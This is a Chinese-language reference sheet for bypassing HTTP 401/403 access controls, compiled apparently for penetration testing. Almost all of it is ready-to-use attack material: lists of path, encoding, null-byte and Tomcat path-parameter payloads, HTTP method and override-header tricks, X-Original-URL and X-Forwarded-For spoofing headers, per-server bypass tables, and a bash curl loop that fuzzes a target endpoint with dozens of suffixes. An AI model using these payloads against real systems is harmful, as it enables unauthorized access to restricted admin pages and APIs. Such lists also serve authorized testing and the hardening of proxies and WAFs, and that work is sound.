# 401/403 Bypass — Complete Reference

> 融合自 401-403-bypass + api-fuzz 403 patterns。
> 核心思路：反向代理/WAF 检查一种路径格式，但后端做了不同的路径规范化。

---

## 1. 路径操纵 Payload 全集

### 1.1 尾部斜杠 / 点

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 大小写

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

代理规则区分大小写但后端不区分时有效（常见于 Windows/IIS）。

### 1.3 URL 编码

```
/admin          → 403
/%61dmin        → 200  ✓ (编码 'a')
/admi%6e        → 200  ✓ (编码 'n')
/%61%64%6d%69%6e → 200  ✓ (全编码)
```

### 1.4 双重 URL 编码

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25=%, 解码两次: %61→a)
/admin%252f         → 200  ✓
```

### 1.5 Unicode / UTF-8 过长编码

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 '.')
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 点段 / 路径穿越

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat 路径参数)
```

### 1.7 NULL 字节

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
```

### 1.8 路径参数注入（Java/Tomcat）

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat 将 ; 视为路径参数)
/admin;         → 200  ✓
/;/admin        → 200  ✓
```

### 1.9 尾部特殊字符

```
/admin%20       /admin%09       /admin?
/admin.json     /admin.html     /admin/~
```

### 1.10 反斜杠（Windows/IIS）

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 组合

```
///admin///    /./admin/./    /admin/..;/admin    /%2e/admin
```

---

## 2. HTTP 方法绕过

### 2.1 直接更换方法

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (可能泄露 Allowed Methods)
HEAD /admin → 200  ✓ (确认可访问，无 body)
```

### 2.2 Method Override Header

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

POST /admin HTTP/1.1
_method=PUT  (POST body — Rails/Laravel)
```

### 2.3 自定义 / 无效方法

```
FOOBAR /admin HTTP/1.1     → 部分 ACL 只检查 GET/POST
PROPFIND /admin HTTP/1.1   → WebDAV 方法
```

---

## 3. Header 绕过

### 3.1 URL 重写 Header（Nginx/IIS）

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

### 3.2 IP 伪造 Header（白名单绕过）

每个 header 尝试 `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`：

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | Forwarded: for=127.0.0.1
```

IP 编码变体：`0177.0.0.1`（八进制）, `2130706433`（十进制）, `0x7f000001`（十六进制）

### 3.3 其他 Header

```http
Referer: https://target.com/admin
Origin: https://target.com
Host: localhost
X-Forwarded-Host: localhost
Content-Type: application/json
X-Requested-With: XMLHttpRequest
```

---

## 4. 协议版本绕过

```http
# HTTP/1.0（部分 ACL 只针对 HTTP/1.1）
GET /admin HTTP/1.0

# HTTP/0.9（极老，无 header）
GET /admin
```

---

## 5. 组合攻击

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP 伪造 + 路径编码
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # 协议 + 大小写 + IP 伪造
X-Forwarded-For: 127.0.0.1
```

---

## 6. 中间件特定绕过

| 服务器 | 关键技巧 |
|--------|---------|
| **Apache** | `/admin/`(尾部斜杠), `/.admin`(点前缀), `/admin%0d`(CR) |
| **Nginx** | `/Admin`(大小写), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css`(路径参数+扩展名), `/admin\`(反斜杠), `/admin::$DATA`(ADS) |
| **Tomcat/Java** | `/admin;foo`(路径参数), `/admin..;/`(穿越), `/;/admin` |
| **Spring** | `/admin.anything`(后缀匹配，旧版), `/admin/`(尾部斜杠) |

---

## 7. 403 绕过 Fuzz 字典

```bash
# 在 403 端点末尾逐一添加以下后缀进行 fuzz
for suffix in \
    '%09' '%20' '%23' '%2e' '%2f' '/%2e/' '//' '/..;/' '//..;/' \
    '/%20' '/%09' '/%00' '/.json' '/.css' '/.html' '/?' '/??' '/???' \
    '/?testparam' '/#' '/#test' '//.' '////' '/.//./' '~' '.' ';' '..;' \
    ';%09' ';%09..' ';%09..;' ';%2f..' '*' '.json' '../' '..;/' \
    '?a.css' '?a.js' '?a.jpg' '?a.png' '../admin' '..%2f' './' '.%2f' \
    '..%00/' '..%0d/' '..%5c' '&' '%40' '?' '??' '...\\' '.././' '/;/' \
    '.%2e/' '..\\' '..%ff/' '%2e%2e%2f' '%3f' '?.css' '?.js' \
    '%3f.css' '%3f.js' '%26' '%0a' '%0d' '%0d%0a' '%3b' '\\' '.\\';
do
    resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
        "http://target${ENDPOINT}${suffix}")
    echo "${suffix} → ${resp}"
done
```

---

## 8. 多位置 Fuzz

后缀不只能加在末尾——路径中的每一层目录都可能是绕过点：

```
原始: /api/admin/users
位置1: /api/admin/users.json        ← 末尾
位置2: /api/admin/.json/users       ← 中间层
位置3: /api/.json/admin/users       ← 靠前位置
位置4: /api/admin/users/..;/users   ← 路径回溯
```

---

## 9. 响应字节分析

绕过尝试后，不能只看状态码——更重要的是**响应字节长度**：

| 状态 | 字节变化 | 含义 |
|------|----------|------|
| 403 → 200 | 字节大幅增加 | ✅ 绕过成功，加载了新数据 |
| 403 → 200 | 字节很小（几十字节） | ⚠️ 可能只是空页面/默认页 |
| 200 → 200 | 字节从小变大 | ✅ 不同后缀加载了不同数据 |
| 任何状态 | 字节和正常页面一样 | 未绕过，只是返回了默认页 |

当字节明显变大时，说明加载了新的内容（可能是新的 JS 文件、新的 API 数据），这些新内容中可能包含更多可利用的接口和信息。

---

## 10. 自动化工具

```bash
# byp4xx — 综合 403 绕过扫描
./byp4xx.sh https://target.com/admin

# 403bypasser
python3 403bypasser.py -u https://target.com/admin

# BypassPro (Burp 插件)
# https://github.com/0x727/BypassPro
# 自动对 403 接口进行多位置、多后缀 fuzz
```

---

## 11. 速查 — Top 10 Payload

```http
GET /admin/     HTTP/1.1        # 尾部斜杠
GET /Admin      HTTP/1.1        # 大小写
GET /admin%20   HTTP/1.1        # 尾部空格
GET /./admin    HTTP/1.1        # 点段
GET //admin     HTTP/1.1        # 双斜杠
POST /admin     HTTP/1.1        # 方法切换
GET / HTTP/1.1                  # X-Original-URL
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP 白名单
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS 路径参数
GET /admin..;/ HTTP/1.1         # Tomcat 绕过
```

---

*403 Bypass Complete Reference v1.0 — Fused from 401-403-bypass + api-fuzz*
